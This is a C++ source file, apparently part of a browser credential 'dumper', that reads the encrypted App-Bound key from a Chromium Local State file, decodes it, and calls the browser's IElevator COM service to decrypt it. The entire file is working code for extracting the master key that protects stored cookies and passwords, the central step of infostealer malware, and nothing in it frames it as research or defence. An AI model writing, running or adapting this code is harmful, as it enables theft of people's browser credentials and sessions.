#include "dumper.h"

bool dumper::com::init() {
    return SUCCEEDED(CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED));
};

bool dumper::com::createElevator(Microsoft::WRL::ComPtr<IElevator>& elevator, BrowserElevatorConfig& config) {
    return SUCCEEDED(CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, (void**)&elevator));
}

bool dumper::com::setProxyBlanket(Microsoft::WRL::ComPtr<IElevator>& elevator) {
    return SUCCEEDED(CoSetProxyBlanket(
        elevator.Get(),
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING
    ));
}

inline bool isBase64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

vector<uint8_t> dumper::base64::decode(string& encodedStr) {
    int in_len = encodedStr.size();
    int i = 0, j = 0, in_ = 0;
    uint8_t char_array_4[4]{}, char_array_3[3]{};
    vector<uint8_t> decodedData;

    while (in_len-- && (encodedStr[in_] != '=') && isBase64(encodedStr[in_])) {
        char_array_4[i++] = encodedStr[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = dumper::consts::BASE64_CHARS.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) decodedData.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = dumper::consts::BASE64_CHARS.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; j < i - 1; j++) decodedData.push_back(char_array_3[j]);
    }

    return decodedData;
}


vector<uint8_t> dumper::key::retrieveEncryptedKey(std::wstring& localStatePath) {

    std::wstring fullPath = localStatePath;

    ifstream file(fullPath);
    if (!file.is_open()) {
        return {};
    }

    string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    const string searchKey = "\"app_bound_encrypted_key\":\"";
    size_t keyStartPos = fileContent.find(searchKey);
    if (keyStartPos == std::string::npos) {
        return {};
    }

    keyStartPos += searchKey.length();
    size_t keyEndPos = fileContent.find("\"", keyStartPos);

    if (keyEndPos == string::npos) {
        return {};
    }

    string base64EncryptedKey = fileContent.substr(keyStartPos, keyEndPos - keyStartPos);
    vector<uint8_t> encryptedKeyWithHeader = base64::decode(base64EncryptedKey);

    if (encryptedKeyWithHeader.size() < sizeof(consts::keyPrefix) ||
        !std::equal(std::begin(consts::keyPrefix), std::end(consts::keyPrefix), encryptedKeyWithHeader.begin())) {
        return {};
    }

    return vector<uint8_t>(encryptedKeyWithHeader.begin() + sizeof(dumper::consts::keyPrefix), encryptedKeyWithHeader.end());
}

PBYTE dumper::key::decryptKey(Microsoft::WRL::ComPtr<IElevator> elevator, vector<uint8_t>& encryptedKey) {

    BSTR ciphertextData = SysAllocStringByteLen(reinterpret_cast<const char*>(encryptedKey.data()), encryptedKey.size());
    BSTR plaintextData = nullptr;
    DWORD lastError = 0;

    if (!SUCCEEDED(elevator->DecryptData(ciphertextData, &plaintextData, &lastError))) {
        return NULL;
    }

    BYTE* decrypted_key = new BYTE[consts::keySize];
    memcpy(decrypted_key, (void*)plaintextData, consts::keySize);

    SysFreeString(plaintextData);

    return decrypted_key;
}

PBYTE dumper::getAppBoundKey(BrowserElevatorConfig& config, std::wstring& localStatePath) {
    Microsoft::WRL::ComPtr<IElevator> elevator;

    if (!com::init())
        return NULL;

    if (!com::createElevator(elevator, config))
        return NULL;

    if (!com::setProxyBlanket(elevator))
        return NULL;

    auto encKey = key::retrieveEncryptedKey(localStatePath);

    PBYTE key = key::decryptKey(elevator, encKey);

    return key;
}